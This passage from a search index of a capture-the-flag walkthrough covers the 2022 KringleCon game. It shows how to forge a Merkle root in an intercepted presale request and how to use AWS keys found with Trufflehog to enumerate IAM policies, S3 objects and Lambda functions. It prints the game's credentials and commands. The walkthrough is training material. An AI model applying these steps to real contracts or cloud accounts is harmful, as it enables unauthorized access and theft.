passing the root key as part of the request. So all we need to do is generate a Merkle tree of our own containing our wallet address, then provide that address and proof value to the form while altering the root value passed in the POST request to be the root value our our tree, and the validation should work. The Professor's GitHub repo includes a Python file that can be run directly on your local system, provided the necessary libraries are available, or as a Docker image. In either event, edit the allowlist variable in the code to contain your wallet address along with some other value, then run the script to generate a root and proof value. Validate that things will work by entering your address and proof into the web form, then intercepting the POST with Burp Suite and change the root value to our root, then forward it on. If all works as expected your address will be verified as being on the presale list. Then it's just a matter of approving a 100 KC transaction to the address 0xe8fC6f6a76BE243122E3d01A1c544F87f1264d3a, then coming back to the presale form and repeating the process with the 'Validate Only' box unchecked. After your transaction is complete, go to the Gallery page and find your Sporc. Note that once you know your Sporc number you can get it directly at the URL https://boredsporcrowboatsociety.com/TOKENS/TOKENIMAGES/BSRS###.png","title":"Solution"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/16_Exploit_a_Smart_Contract/#conclusion","text":"Luigi What!? How'd you get on the list? What's that? You's a double agent, and you're actually workin' for us? I don't know if I buy that, but you're on the list, so... myeah. Somethin' about this ain't sittin' right with me, but there's no reversing transactions with cryptocurrency. That NFT is yours to keep, but if I find out you're lyin' to me, Palzari's gonna pay you a visit. Kapeesh?","title":"Conclusion"},{"location":"quests/Recover_the_Cloud_Ring/","text":"Recover the Cloud Ring This quest line takes place on the fifth level of the subterranean labyrinth and consists of 3 objectives. AWS CLI Intro Trufflehog Search Exploitation via AWS CLI !","title":"Recover the Cloud Ring"},{"location":"quests/Recover_the_Cloud_Ring/#recover-the-cloud-ring","text":"This quest line takes place on the fifth level of the subterranean labyrinth and consists of 3 objectives. AWS CLI Intro Trufflehog Search Exploitation via AWS CLI !","title":"Recover the Cloud Ring"},{"location":"quests/Recover_the_Cloud_Ring/11_AWS_CLI_Intro/","text":"AWS CLI Intro AWS CLI Intro Difficulty : Try out some basic AWS command line skills in this terminal. Talk to Jill Underpole in the Cloud Ring for hints. Elf Introduction Jill Underpole Umm, can I help you? Me? I'm Jill Underpole, thank you very much. I'm working on this here smoke terminal. Cloud? Sure, whatever you want to call it. Anyway, you're welcome to try this out, if you think you know what you're doing. You'll have to learn some basics about the AWS command line interface (CLI) to be successful though. Solution Open the terminal next to Jill Underpole to start the AWS CLI tutorial, and answer the questions using either the instructions or the help references. You may not know this, but AWS CLI help messages are very easy to access. First, try typing: $ aws help Answer elf@349ba0da09f9:~$ aws help Great! When you're done, you can quit with q. Next, please configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY , the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1 . https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config For this task we just need to enter the aws configure command and respond to the prompts. Answer elf@349ba0da09f9:~$ aws configure AWS Access Key ID [None]: AKQAAYRKO7A5Q5XUY2IY AWS Secret Access Key [None]: qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf Default region name [None]: us-east-1 Default output format [None]: elf@349ba0da09f9:~$ Excellent! To finish, please get your caller identity using the AWS command line. For more details please reference: $ aws sts help or reference: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/index.html For this task we just need to enter the aws sts command to get our caller identity, which can be found in the help reference. Answer elf@349ba0da09f9:~$ aws sts get-caller-identity { \"UserId\": \"AKQAAYRKO7A5Q5XUY2IY\", \"Account\": \"602143214321\", \"Arn\": \"arn:aws:iam::602143214321:user/elf_helpdesk\" } elf@349ba0da09f9:~$ Completion Jill Underpole Wait, you got it done, didn't you? Ok, consider me impressed. You could probably help Gerty, too. The first trick'll be running the Trufflehog tool. It's as good at sniffing out secrets as I am at finding mushrooms! After that, it's just a matter of getting to the secret the tool found. I'd bet a basket of portobellos you'll get this done!","title":"AWS CLI Intro"},{"location":"quests/Recover_the_Cloud_Ring/11_AWS_CLI_Intro/#aws-cli-intro","text":"AWS CLI Intro Difficulty : Try out some basic AWS command line skills in this terminal. Talk to Jill Underpole in the Cloud Ring for hints.","title":"AWS CLI Intro"},{"location":"quests/Recover_the_Cloud_Ring/11_AWS_CLI_Intro/#elf-introduction","text":"Jill Underpole Umm, can I help you? Me? I'm Jill Underpole, thank you very much. I'm working on this here smoke terminal. Cloud? Sure, whatever you want to call it. Anyway, you're welcome to try this out, if you think you know what you're doing. You'll have to learn some basics about the AWS command line interface (CLI) to be successful though.","title":"Elf Introduction"},{"location":"quests/Recover_the_Cloud_Ring/11_AWS_CLI_Intro/#solution","text":"Open the terminal next to Jill Underpole to start the AWS CLI tutorial, and answer the questions using either the instructions or the help references. You may not know this, but AWS CLI help messages are very easy to access. First, try typing: $ aws help Answer elf@349ba0da09f9:~$ aws help Great! When you're done, you can quit with q. Next, please configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY , the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1 . https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config For this task we just need to enter the aws configure command and respond to the prompts. Answer elf@349ba0da09f9:~$ aws configure AWS Access Key ID [None]: AKQAAYRKO7A5Q5XUY2IY AWS Secret Access Key [None]: qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf Default region name [None]: us-east-1 Default output format [None]: elf@349ba0da09f9:~$ Excellent! To finish, please get your caller identity using the AWS command line. For more details please reference: $ aws sts help or reference: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/index.html For this task we just need to enter the aws sts command to get our caller identity, which can be found in the help reference. Answer elf@349ba0da09f9:~$ aws sts get-caller-identity { \"UserId\": \"AKQAAYRKO7A5Q5XUY2IY\", \"Account\": \"602143214321\", \"Arn\": \"arn:aws:iam::602143214321:user/elf_helpdesk\" } elf@349ba0da09f9:~$","title":"Solution"},{"location":"quests/Recover_the_Cloud_Ring/11_AWS_CLI_Intro/#completion","text":"Jill Underpole Wait, you got it done, didn't you? Ok, consider me impressed. You could probably help Gerty, too. The first trick'll be running the Trufflehog tool. It's as good at sniffing out secrets as I am at finding mushrooms! After that, it's just a matter of getting to the secret the tool found. I'd bet a basket of portobellos you'll get this done!","title":"Completion"},{"location":"quests/Recover_the_Cloud_Ring/12_Trufflehog_Search/","text":"Trufflehog Search Trufflehog Search Difficulty : Use Trufflehog to find secrets in a Git repo. Work with Jill Underpole in the Cloud Ring for hints. What's the name of the file that has AWS credentials? Elf Introduction Gerty Snowburrow Well now, look who's venturing down into the caves! And well, who might you be, exaclty? I'm Gerty Snowburrow, if you need to know. And, not that I should be telling you, but I'm trying to figure out what Alabaster Snowball's done this time. Word is, he committed some secrets to a code repo. If you're feeling so inclined, you can try and find them for me. Hints and Resources Other resources Trufflehog https://github.com/trufflesecurity/trufflehog Solution Open the terminal next to Sulfrod to start this challenge. Note that after completing this the terminal will continue on to the Exploitation via AWS CLI objective. Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git. Configure these credentials for us-east-1 and then run: $ aws sts get-caller-identity For this objective we first need to run Trufflehog against the Gitlab repository elf@417fd161b3c8:~$ trufflehog git https://haugfactory.com/asnowball/aws_scripts.git \ud83d\udc37\ud83d\udd11\ud83d\udc37 TruffleHog. Unearth your secrets. \ud83d\udc37\ud83d\udd11\ud83d\udc37 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts.git Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: PLAIN Raw result: add-a-file-using-the- Repository: https://haugfactory.com/asnowball/aws_scripts.git Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: BASE64 Raw result: add-a-file-using-the- Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts.git 2 Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 elf@417fd161b3c8:~$ From this output we see that there are two files that might contain secret information Line 6 of put_policy.py Line 14 of README.md The repository is publicly available, so use a browser to access https://haugfactory.com/asnowball/aws_scripts in a browser. Select the put_policy.py file and select the 'History' button. Here we see that there have been 4 commits to this file, two on 6-Sep-2022, and two on 7-Sep-2022 Browse each of the commits in reverse order using the 'Browse File' button, and we discover the the first commit on 7-Sep-2022 contained AWS keys. Use these keys to configure and confirm your AWS identity. Answer elf@b6671ab1b76b:~$ aws configure AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD AWS Secret Access Key [None]: e95qToloszIgO9dNBsQMQsc5/foiPdKunPJwc1rL Default region name [None]: us-east-1 Default output format [None]: elf@b6671ab1b76b:~$ aws sts get-caller-identity { \"UserId\": \"AIDAJNIAAQYHIAAHDDRA\", \"Account\": \"602123424321\", \"Arn\": \"arn:aws:iam::602123424321:user/haug\" } elf@b6671ab1b76b:~$ Completion Note that after completing the Trufflehog Search objective the terminal continues on to the Exploitation via AWS CLI objective. Gerty Snowburrow Say, you got it done, didn't you? Well now, you might just be able to tackle the other AWS terminal down here. It's a bit more involved, but you've got the credentials to get it started now. Before you try it, you should know the difference between managed and inline policies. Short version: inline policies apply to one identity (user, role, group), and managed policies can be attached to many identities. There are different AWS CLI commands to interact with each kind. Other than that, the important bit is to know a bit about cloud or IAM privilege escalation. Sometimes attackers find access to more resources by just trying things until something works. But if they have access to the iam service inside the AWS CLI, they might just be able to ask what access they have! You can do it!","title":"Trufflehog Search"},{"location":"quests/Recover_the_Cloud_Ring/12_Trufflehog_Search/#trufflehog-search","text":"Trufflehog Search Difficulty : Use Trufflehog to find secrets in a Git repo. Work with Jill Underpole in the Cloud Ring for hints. What's the name of the file that has AWS credentials?","title":"Trufflehog Search"},{"location":"quests/Recover_the_Cloud_Ring/12_Trufflehog_Search/#elf-introduction","text":"Gerty Snowburrow Well now, look who's venturing down into the caves! And well, who might you be, exaclty? I'm Gerty Snowburrow, if you need to know. And, not that I should be telling you, but I'm trying to figure out what Alabaster Snowball's done this time. Word is, he committed some secrets to a code repo. If you're feeling so inclined, you can try and find them for me.","title":"Elf Introduction"},{"location":"quests/Recover_the_Cloud_Ring/12_Trufflehog_Search/#hints-and-resources","text":"Other resources Trufflehog https://github.com/trufflesecurity/trufflehog","title":"Hints and Resources"},{"location":"quests/Recover_the_Cloud_Ring/12_Trufflehog_Search/#solution","text":"Open the terminal next to Sulfrod to start this challenge. Note that after completing this the terminal will continue on to the Exploitation via AWS CLI objective. Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git. Configure these credentials for us-east-1 and then run: $ aws sts get-caller-identity For this objective we first need to run Trufflehog against the Gitlab repository elf@417fd161b3c8:~$ trufflehog git https://haugfactory.com/asnowball/aws_scripts.git \ud83d\udc37\ud83d\udd11\ud83d\udc37 TruffleHog. Unearth your secrets. \ud83d\udc37\ud83d\udd11\ud83d\udc37 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts.git Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: PLAIN Raw result: add-a-file-using-the- Repository: https://haugfactory.com/asnowball/aws_scripts.git Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: BASE64 Raw result: add-a-file-using-the- Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts.git 2 Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 elf@417fd161b3c8:~$ From this output we see that there are two files that might contain secret information Line 6 of put_policy.py Line 14 of README.md The repository is publicly available, so use a browser to access https://haugfactory.com/asnowball/aws_scripts in a browser. Select the put_policy.py file and select the 'History' button. Here we see that there have been 4 commits to this file, two on 6-Sep-2022, and two on 7-Sep-2022 Browse each of the commits in reverse order using the 'Browse File' button, and we discover the the first commit on 7-Sep-2022 contained AWS keys. Use these keys to configure and confirm your AWS identity. Answer elf@b6671ab1b76b:~$ aws configure AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD AWS Secret Access Key [None]: e95qToloszIgO9dNBsQMQsc5/foiPdKunPJwc1rL Default region name [None]: us-east-1 Default output format [None]: elf@b6671ab1b76b:~$ aws sts get-caller-identity { \"UserId\": \"AIDAJNIAAQYHIAAHDDRA\", \"Account\": \"602123424321\", \"Arn\": \"arn:aws:iam::602123424321:user/haug\" } elf@b6671ab1b76b:~$","title":"Solution"},{"location":"quests/Recover_the_Cloud_Ring/12_Trufflehog_Search/#completion","text":"Note that after completing the Trufflehog Search objective the terminal continues on to the Exploitation via AWS CLI objective. Gerty Snowburrow Say, you got it done, didn't you? Well now, you might just be able to tackle the other AWS terminal down here. It's a bit more involved, but you've got the credentials to get it started now. Before you try it, you should know the difference between managed and inline policies. Short version: inline policies apply to one identity (user, role, group), and managed policies can be attached to many identities. There are different AWS CLI commands to interact with each kind. Other than that, the important bit is to know a bit about cloud or IAM privilege escalation. Sometimes attackers find access to more resources by just trying things until something works. But if they have access to the iam service inside the AWS CLI, they might just be able to ask what access they have! You can do it!","title":"Completion"},{"location":"quests/Recover_the_Cloud_Ring/13_Exploitation_via_AWS_CLI/","text":"Exploitation via AWS CLI Exploitation via AWS CLI Difficulty : Flex some more advanced AWS CLI skills to escalate privileges! Help Gerty Snowburrow in the Cloud Ring to get hints for this challenge. Spork Introduction Sulfrod Hey! You - come here! You look like someone who knows how to do this nerd stuff. I need my terminal to be stronger, like me! flexes You're gonna do that for me so I can bust into this cloud machine thing Hints and Resources Other resources Chris Elgee, All I want for AWS is Allow * | KringleCon 2022 https://www.youtube.com/watch?v=t-xDvVUialo&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=3&t=8s Setup Configure your AWS credentials that you discovered during the Trufflehog Search objective. elf@b6671ab1b76b:~$ aws configure AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD AWS Secret Access Key [None]: e95qToloszIgO9dNBsQMQsc5/foiPdKunPJwc1rL Default region name [None]: us-east-1 Default output format [None]: elf@b6671ab1b76b:~$ aws sts get-caller-identity { \"UserId\": \"AIDAJNIAAQYHIAAHDDRA\", \"Account\": \"602123424321\", \"Arn\": \"arn:aws:iam::602123424321:user/haug\" } elf@b6671ab1b76b:~$ Solution Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user. The aws iam command to list attached user policies can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-user-policies. Answer elf@b6671ab1b76b:~$ aws iam list-attached-user-policies --user-name haug { \"AttachedPolicies\": [ { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyArn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" } ], \"IsTruncated\": false } elf@b6671ab1b76b:~$ Now, view or get the policy that is attached to your user. The aws iam command to get a policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Answer elf@b6671ab1b76b:~$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY { \"Policy\": { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyId\": \"ANPAYYOROBUERT7TGKUHA\", \"Arn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\", \"Path\": \"/\", \"DefaultVersionId\": \"v1\", \"AttachmentCount\": 11, \"PermissionsBoundaryUsageCount\": 0, \"IsAttachable\": true, \"Description\": \"Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.\", \"CreateDate\": \"2022-06-21 22:02:30+00:00\", \"UpdateDate\": \"2022-06-21 22:10:29+00:00\", \"Tags\": [] } } elf@b6671ab1b76b:~$ Attached policies can have multiple versions. View the default version of this policy. The aws iam command to get a policy version can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Answer elf@b6671ab1b76b:~$ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TI ER1_READONLY_POLICY --version-id v1 { \"PolicyVersion\": { \"Document\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"lambda:ListFunctions\", \"lambda:GetFunctionUrlConfig\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetUserPolicy\", \"iam:ListUserPolicies\", \"iam:ListAttachedUserPolicies\" ], \"Resource\": \"arn:aws:iam::602123424321:user/${aws:username}\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetPolicy\", \"iam:GetPolicyVersion\" ], \"Resource\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" }, { \"Effect\": \"Deny\", \"Principal\": \"*\", \"Action\": [ \"s3:GetObject\", \"lambda:Invoke*\" ], \"Resource\": \"*\" } ] }, \"VersionId\": \"v1\", \"IsDefaultVersion\": false, \"CreateDate\": \"2022-06-21 22:02:30+00:00\" } } elf@b6671ab1b76b:~$ Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. The aws iam command to list user policies can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-attached-user-policies. Answer elf@b6671ab1b76b:~$ aws iam list-user-policies --user-name haug { \"PolicyNames\": [ \"S3Perms\" ], \"IsTruncated\": false } elf@b6671ab1b76b:~$ Now, use the AWS CLI to get the only inline policy for your user. The aws iam command to get a user policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Answer elf@b6671ab1b76b:~$ aws iam list-user-policies --user-name haug { \"PolicyNames\": [ \"S3Perms\" ], \"IsTruncated\": false } elf@b6671ab1b76b:~$ aws iam get-user-policy --user-name haug --policy-name S3Perms { \"UserPolicy\": { \"UserName\": \"haug\", \"PolicyName\": \"S3Perms\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"s3:ListObjects\" ], \"Resource\": [ \"arn:aws:s3:::smogmachines3\", \"arn:aws:s3:::smogmachines3/*\" ] } ] } }, \"IsTruncated\": false } elf@b6671ab1b76b:~$ The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. List those objects! The aws s3api command to list objects in an s3 bucket can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html Answer elf@b6671ab1b76b:~$ aws s3api list-objects --bucket smogmachines3 { \"IsTruncated\": false, \"Marker\": \"\", \"Contents\": [ { \"Key\": \"coal-fired-power-station.jpg\", \"LastModified\": \"2022-09-23 20:40:44+00:00\", \"ETag\": \"\\\"1c70c98bebaf3cff781a8fd3141c2945\\\"\", \"Size\": 59312, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"industry-smog.png\", \"LastModified\": \"2022-09-23 20:40:47+00:00\", \"ETag\": \"\\\"c0abe5cb56b7a33d39e17f430755e615\\\"\", \"Size\": 272528, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"pollution-smoke.jpg\", \"LastModified\": \"2022-09-23 20:40:43+00:00\", \"ETag\": \"\\\"465b675c70d73027e13ffaec1a38beec\\\"\", \"Size\": 33064, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"pollution.jpg\", \"LastModified\": \"2022-09-23 20:40:45+00:00\", \"ETag\": \"\\\"d40d1db228c9a9b544b4c552df712478\\\"\", \"Size\": 81775, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"power-station-smoke.jpg\", \"LastModified\": \"2022-09-23 20:40:48+00:00\", \"ETag\": \"\\\"2d7a8c8b8f5786103769e98afacf57de\\\"\", \"Size\": 45264, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"smog-power-station.jpg\", \"LastModified\": \"2022-09-23 20:40:46+00:00\", \"ETag\": \"\\\"0e69b8d53d97db0db9f7de8663e9ec09\\\"\", \"Size\": 32498, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py\", \"LastModified\": \"2022-09-26 16:31:33+00:00\", \"ETag\": \"\\\"fd5d6ab630691dfe56a3fc2fcfb68763\\\"\", \"Size\": 5823, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } } ], \"Name\": \"smogmachines3\", \"Prefix\": \"\", \"MaxKeys\": 1000, \"EncodingType\": \"url\" } elf@b6671ab1b76b:~$ The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions. The aws lambda command to list functions can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html Answer elf@b6671ab1b76b:~$ aws lambda list-functions { \"Functions\": [ { \"FunctionName\": \"smogmachine_lambda\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda\", \"Runtime\": \"python3.9\", \"Role\": \"arn:aws:iam::602123424321:role/smogmachine_lambda\", \"Handler\": \"handler.lambda_handler\", \"CodeSize\": 2126, \"Description\": \"\", \"Timeout\": 600, \"MemorySize\": 256, \"LastModified\": \"2022-09-07T19:28:23.634+0000\", \"CodeSha256\": \"GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=\", \"Version\": \"$LATEST\", \"VpcConfig\": { \"SubnetIds\": [ \"subnet-8c80a9cb8b3fa5505\" ], \"SecurityGroupIds\": [ \"sg-b51a01f5b4711c95c\" ], \"VpcId\": \"vpc-85ea8596648f35e00\" }, \"Environment\": { \"Variables\": { \"LAMBDASECRET\": \"975ceab170d61c75\", \"LOCALMNTPOINT\": \"/mnt/smogmachine_files\" } }, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"7e198c3c-d4ea-48dd-9370-e5238e9ce06e\", \"FileSystemConfigs\": [ { \"Arn\": \"arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap- db3277b03c6e975d2\", \"LocalMountPath\": \"/mnt/smogmachine_files\" } ], \"PackageType\": \"Zip\", \"Architectures\": [ \"x86_64\" ], \"EphemeralStorage\": { \"Size\": 512 } } ] } elf@b6671ab1b76b:~$ Lambda functions can have public URLs from which they are directly accessible. Use the AWS CLI to get the configuration containing the public URL of the Lambda function. The aws lambda command to get the function URL config can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html Answer elf@b6671ab1b76b:~$ aws lambda get-function-url-config --function-name smogmachine_lambda { \"FunctionUrl\": \"https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda\", \"AuthType\": \"AWS_IAM\", \"Cors\": { \"AllowCredentials\": false, \"AllowHeaders\": [], \"AllowMethods\": [ \"GET\", \"POST\" ], \"AllowOrigins\": [ \"*\" ], \"ExposeHeaders\": [], \"MaxAge\": 0 }, \"CreationTime\": \"2022-09-07T19:28:23.808713Z\", \"LastModifiedTime\": \"2022-09-07T19:28:23.808713Z\" } elf@b6671ab1b76b:~$ Completion Sulfrod Ha! Now I have the ring! This computer stuff sure is easy if you just make someone do it for you. Wait.. the computer gave you the ring? Gah, whatever. This never happened, got it? Now beat it, nerd!","title":"Exploitation via AWS CLI"},{"location":"quests/Recover_the_Cloud_Ring/13_Exploitation_via_AWS_CLI/#exploitation-via-aws-cli","text":"Exploitation via AWS CLI Difficulty : Flex some more advanced AWS CLI skills to escalate privileges! Help Gerty Snowburrow in the Cloud Ring to get hints for this challenge.","title":"Exploitation via AWS CLI"},{"location":"quests/Recover_the_Cloud_Ring/13_Exploitation_via_AWS_CLI/#spork-introduction","text":"Sulfrod Hey! You - come here! You look like someone who knows how to do this nerd stuff. I need my terminal to be stronger, like me! flexes You're gonna do that for me so I can bust into this cloud machine thing","title":"Spork Introduction"},{"location":"quests/Recover_the_Cloud_Ring/13_Exploitation_via_AWS_CLI/#hints-and-resources","text":"Other resources Chris Elgee, All I want for AWS is Allow * | KringleCon 2022 https://www.youtube.com/watch?v=t-xDvVUialo&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=3&t=8s","title":"Hints and Resources"},{"location":"quests/Recover_the_Cloud_Ring/13_Exploitation_via_AWS_CLI/#setup","text":"Configure your AWS credentials that you discovered during the Trufflehog Search objective. elf@b6671ab1b76b:~$ aws configure AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD AWS Secret Access Key [None]: e95qToloszIgO9dNBsQMQsc5/foiPdKunPJwc1rL Default region name [None]: us-east-1 Default output format [None]: elf@b6671ab1b76b:~$ aws sts get-caller-identity { \"UserId\": \"AIDAJNIAAQYHIAAHDDRA\", \"Account\": \"602123424321\", \"Arn\": \"arn:aws:iam::602123424321:user/haug\" } elf@b6671ab1b76b:~$","title":"Setup"},{"location":"quests/Recover_the_Cloud_Ring/13_Exploitation_via_AWS_CLI/#solution","text":"Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user. The aws iam command to list attached user policies can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-user-policies. Answer elf@b6671ab1b76b:~$ aws iam list-attached-user-policies --user-name haug { \"AttachedPolicies\": [ { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyArn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" } ], \"IsTruncated\": false } elf@b6671ab1b76b:~$ Now, view or get the policy that is attached to your user. The aws iam command to get a policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Answer elf@b6671ab1b76b:~$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY { \"Policy\": { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyId\": \"ANPAYYOROBUERT7TGKUHA\", \"Arn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\", \"Path\": \"/\", \"DefaultVersionId\": \"v1\", \"AttachmentCount\": 11, \"PermissionsBoundaryUsageCount\": 0, \"IsAttachable\": true, \"Description\": \"Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.\", \"CreateDate\": \"2022-06-21 22:02:30+00:00\", \"UpdateDate\": \"2022-06-21 22:10:29+00:00\", \"Tags\": [] } } elf@b6671ab1b76b:~$ Attached policies can have multiple versions. View the default version of this policy. The aws iam command to get a policy version can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Answer elf@b6671ab1b76b:~$ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TI ER1_READONLY_POLICY --version-id v1 { \"PolicyVersion\": { \"Document\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"lambda:ListFunctions\", \"lambda:GetFunctionUrlConfig\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetUserPolicy\", \"iam:ListUserPolicies\", \"iam:ListAttachedUserPolicies\" ], \"Resource\": \"arn:aws:iam::602123424321:user/${aws:username}\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetPolicy\", \"iam:GetPolicyVersion\" ], \"Resource\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" }, { \"Effect\": \"Deny\", \"Principal\": \"*\", \"Action\": [ \"s3:GetObject\", \"lambda:Invoke*\" ], \"Resource\": \"*\" } ] }, \"VersionId\": \"v1\", \"IsDefaultVersion\": false, \"CreateDate\": \"2022-06-21 22:02:30+00:00\" } } elf@b6671ab1b76b:~$ Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. The aws iam command to list user policies can be found here: 